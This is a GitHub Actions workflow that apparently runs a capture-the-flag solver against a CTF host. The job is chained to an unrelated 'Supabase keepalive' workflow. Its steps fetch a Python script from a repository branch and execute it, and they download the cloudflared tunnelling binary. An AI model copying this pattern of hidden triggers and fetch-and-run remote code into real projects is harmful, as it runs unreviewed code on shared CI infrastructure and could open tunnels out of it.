name: DFO CTF temporary runner
on:
  workflow_run:
    workflows: ["Supabase keepalive"]
    types: [completed]
  workflow_dispatch: {}
jobs:
  solve:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - name: Execute authorized CTF solver
        shell: bash
        env:
          TARGET: https://89bd5e3214914b0cb088.kit.sasc.tf:443
        run: |
          set -euo pipefail
          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/source.b64 | base64 -d > /tmp/source.png
          sha256sum /tmp/source.png
          test "$(sha256sum /tmp/source.png | cut -d' ' -f1)" = "51262872d8d18cfb1068b4dbdbb10d491cfc47e075fe474327b0695f4f97d4c1"
          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/solve.py -o /tmp/solve.py
          curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cloudflared
          chmod +x /tmp/cloudflared
          command -v pdftotext || (sudo apt-get update && sudo apt-get install -y poppler-utils)
          python3 /tmp/solve.py
